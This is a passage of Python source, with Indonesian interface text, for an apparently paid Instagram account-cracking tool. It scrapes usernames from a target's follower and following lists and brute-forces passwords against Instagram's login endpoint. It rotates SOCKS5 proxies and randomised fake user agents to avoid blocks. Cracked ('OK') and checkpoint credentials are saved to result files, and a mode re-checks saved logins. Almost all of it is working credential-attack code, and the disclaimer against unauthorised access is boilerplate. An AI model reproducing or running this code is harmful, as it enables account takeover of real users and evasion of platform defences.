                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI, username, sandi)
                except:
                    #print('Error')
                    pass
        print('\n')
        os.popen("play-audio data/selesai.mp3")
        oi = '# CRACK SELESAI'
        io = mark(oi, style='yellow')
        sol().print(io)
        exit()

    def APIinfo(self,user):
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'1217981644879628'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass

        return nama,pengikut,mengikut,postingan

    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        sys.stdout.write(f"\r{CY}[â€¢] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip=random.choice(prox)
                proxs= {'http': 'socks5://'+nip}
                ua = random.choice(uasm)
                aa='Mozilla/5.0 (Linux; Android'
                b=random.choice(['4','5','6','7','8','9','10','11','12'])
                c= 'CPH2135'
                d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G','J', 'K', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'])
                e=random.randrange(1, 999)
                f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
                h=random.randrange(73,200)
                i='0'
                j=random.randrange(4200,4900)
                k=random.randrange(40,150)
                l='Mobile Safari/537.36'
                uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                uafake=f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; Infinix Hot {str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
                token=s.get('https://z-p4.www.instagram.com/accounts/logout/ajax/')
                headers = {
                    'Host':'z-p4.www.instagram.com',
                    'connection':'keep-alive',
                    'sec-ch-ua':'"Chromium";v="105", "Not)A;Brand";v="8"',
                    'x-ig-app-id':'1217981644879628',
                    'x-ig-www-claim':'0',
                    'sec-ch-ua-mobile': '?1',
                    'x-instagram-ajax':'a5239aee191e',
                    'content-type':'application/x-www-form-urlencoded',
                    'accept':'*/*',
                    'x-requested-with':'XMLHttpRequest',
                    'x-asbd-id':'198387',
                    'user-agent':uaku,
                    'x-csrftoken':token.cookies['csrftoken'],
                    'sec-ch-ua-platform': '"Android"',
                    'origin':'https://z-p4.www.instagram.com',
                    'sec-fetch-site':'same-origin',
                    'sec-fetch-mode':'cors',
                    'sec-fetch-dest':'empty',
                    'referer':'https://z-p4.www.instagram.com/accounts/logout/ajax/',
                    'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "queryParams": "{}",
                    "optIntoOneTap": 'false',
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=s.post("https://z-p4.www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
                if "userId" in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}\nUserAgent: {uafake}'
                    oi = nel(io, style='green1')
                    print('\n')
                    cetak(nel(oi, title=f'{M2} â€¢ {K2} â€¢ {H2} â€¢ {O2} SUCCESS {day}{H2} â€¢ {K2} â€¢ {M2} â€¢ '))
                    os.popen("play-audio data/live.mp3")
                    open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break

                elif 'checkpoint_url' in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                    print('\n')
                    oi=nel(io,style='yellow1')
                    cetak(nel(oi, title=f'{M2} â€¢ {K2} â€¢ {H2} â€¢ {O2} CHECKPOINT {day}{H2} â€¢ {K2} â€¢ {M2} â€¢ '))
                    os.popen("play-audio data/cp.mp3")
                    open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    break
                
                elif 'ip_block' in str(x.text):
                    sys.stdout.write(f"\r[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0);os.system("play-audio data/ip.mp3")
                    self.crackAPI(user,pas)
                else:
                    continue

            loop+=1
        except:
            self.crackAPI(user,pas)

    def checkAPI(self,user,pw):
        global loop,success,checkpoint
        sys.stdout.write(f"\r{CY}[â€¢] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR3jAWq2wBYDsJQaRy_IdsdE4XaI878vr85TanPmHa33-fv2',
                'x-instagram-ajax': '1006301138-hot',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': random.choice(open("ua.txt","r").read().splitlines()),
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '1217981644879628',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })

            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='green1 ')
                print('\n')
                cetak(nel(oi, title='SUCCESS DETECTOR '))
                open(f"result/successdetector-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                success.append(user)

            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='yellow1')
                print('\n')
                cetak(nel(oi, title=' CHECKPOINT DETECTOR'))
                open(f"result/checkpointdetector-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                checkpoint.append(user)

            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)

    def menu(self):
        self.logo()
        c=input(f' {H}[PILIH] :{C}  ')
        if c=='':
            self.menu()
        elif c in ('1','01'):
            mas='# Masukan jumlah target'
            mas1=mark(mas,style='bold purple ')
            sol().print(mas1)
            m=int(input(f'\n{CY}[â€¢] Jumlah : {C}'));print('')
            mas='# Masukan nama random untuk di searching'
            mas1=mark(mas,style='bold purple ')
            sol().print(mas1)
            for i in range(m):
                i+1
                nama=input(f'{CY}[>] Masukan nama ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)

        elif c in ('2','02'):
            pr='# PASTIKAN TARGET BERSIFAT PUBLIK'
            po=mark(pr,style='red1')
            cetak(nel(po, title='NOTE'))
            mas=input('Apakah anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                masal(self)
            elif mas in ['t','T']:
                massal(self)
            elif mas in ['']:
                print('JANGAN KOSONG!')


        elif c in ('3','03'):
            pr='# PASTIKAN TARGET BERSIFAT PUBLIK'
            po=mark(pr,style='red1')
            cetak(nel(po, title='NOTE'))
            mas=input('Apakah anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['t','T']:
                meng(self)
            elif mas in ['']:
                print('JANGAN KOSONG!')


        elif c in ('4','04'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {CY}>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            print(f'\n{CY}[+] Total Result {H} {len(g)}{C}')
            print(f'\n{CY}[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                self.checkAPI(usr,pwd)
            exit(f'\n\n{K}[#] proses check selesai...{C}')

        elif c in ('5','05'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {U}>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'\n{K}[>] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""
  â”œâ”€â”€[ HASIL {M}CHECKPOINT ]
  â”œâ”€â”€[{K}CP{C}] Username  :{K} {usr}{C}
  â”œâ”€â”€[{K}CP{C}] Password  :{K} {pwd}{C}
  â”œâ”€â”€[{K}CP{C}] Followers :{K} {fol}{C}
  â”œâ”€â”€[{K}CP{C}] Following :{K} {ful}{C}
                    """);sleep(0.05)
                else:
                    print(f"""
  â”œâ”€â”€[ HASIL {H}OK ]
  â”œâ”€â”€[{H}OK{C}] Username  :{H} {usr}{C}
  â”œâ”€â”€[{H}OK{C}] Password  :{H} {pwd}{C}
  â”œâ”€â”€[{H}OK{C}] Pengikut  :{H} {fol}{C}
  â”œâ”€â”€[{H}OK{C}] Mengikuti :{H} {ful}{C}
                    """);sleep(0.05)
        elif c in ('6','06'):
            global following
            six=0
            print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
            x=open('.kukis.log','r').read()
            x_id=re.findall('sessionid=(\d+)',x)[0]
            back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
            for i in following:
                six+=1
                sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
                six_id=self.sixAPI(i)
                print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
                self.unfollowAPI(six_id,'5452333948',self.cookie)
                #print(w)
            input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()

        elif c in ('r','R'):
            self.BUG()
        elif c in ('c','C'):
            self.ChangeLog()
        elif c in ('e','E'):
            self.Exit()

        else:
            self.menu()
def tlisensi():
    banner()
    nt='[bright_white][+] This Tool Paid\n[+] WhatsApp me if you want to buy a license\n[+] \n[+] You shall not misuse the information to gain unauthorised access.\n[+] I will not be Responsible for Anything, Use at Your Own Risk..âš ï¸\n[+] Use it properly..âš ï¸\n'
    nt2 =nel(nt, style='purple  ')
    cetak(nel(nt2, title='NOTEâš ï¸'))
    time.sleep(1)
    lisen=input('[â€¢] Masukankan License: ')
    open('.lisen.txt','w').write(lisen)
    lisensi()


def lisensi():
    try:
        cek=open('.lisen.txt').read()
        lisensikuni.append(cek)
    except:
        tlisensi()
    ses=requests.Session()
    res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyODI0NTYzNiIsIlBkMm5uR3NWSmNjbTFkUEVxYTBZZmJjc0YvMzdKbmNJL1lPVUpUclciXQ==&ProductId=17350&Key='+lisensikuni[0]).json()
    status=res['licenseKey']['key']
    if status ==cek:
        banner()
        wel='# LISENSI BENAR '
        wel2 = mark(wel, style='bold green')
        sol().print(wel2)
        time.sleep(1)
        lisensiku.append("sukses")
        login_kamu()
    else:
        tlisensi()

def mengi(self):
    try:
        menudump.append('mengikuti')
        mas = '#   TARGET HARUS BERSIFAT PUBLIK JANGAN PRIVAT'
        mas1 = mark(mas, style='red1')
        sol().print(mas1)
        m = int(input(f'\n{H}[?{H}] Masukan jumlah target: {N}'))
    except:
        m = 1
    for t in range(m):
        t += 1
        so = f'# TOTAL ID :{len(internal)}'
        pi = mark(so, style='green1')
        sol().print(pi)
        nama = input(f' [{t}] Masukan Username : ')
        id = self.idAPI(self.cookie, nama)
        info = self.infoAPI(
            self.cookie, 'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000', id)
    self.passwordAPI(info)


def meng(self):
	try:
		menudump.append('mengikuti')
		mas = '#   TARGET HARUS BERSIFAT PUBLIK JANGAN PRIVAT'
		mas1 = mark(mas, style='red1')
		sol().print(mas1)
		m = input(f'{H}[â€¢] MASUKKAN USERNAME TARGET : {C}')	
		id = self.idAPI(self.cookie, m)
		info = self.ifoAPI(self.cookie, 'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000', id)
		self.passwordAPI(info)
	except Exception as e:
		exit('GAGAL')

def masal(self):
            try:
                menudump.append('pengikut')
                mas='#   TARGET HARUS BERSIFAT PUBLIK JANGAN PRIVAT'
                mas1=mark(mas,style='red1')
                sol().print(mas1)
                m=int(input(f'\n{H}[?{H}] Masukan jumlah target: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                so=f'# ð“ðŽð“ð€ð‹ ðˆðƒ :{len(internal)}'
                pi=mark(so,style='bold green1')
                sol().print(pi)
                nama=input(f' [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)



def massal(self):
            menudump.append('pengikut')
            mas='# TARGET HARUS BERSIFAT PUBLIK JANGAN PRIVAT'
            mas1=mark(mas,style='red1 ')
            sol().print(mas1)
            m=input(f'{H}[â€¢] MASUKKAN USERNAME TARGET : {C}')

            id=self.idAPI(self.cookie,m)
            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)
            
#--------------------[ SISTEM-CONTROL ]-------------------------#

if __name__=='__main__':
    try:
        login_kamu()
    except requests.exceptions.ConnectionError:
        exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
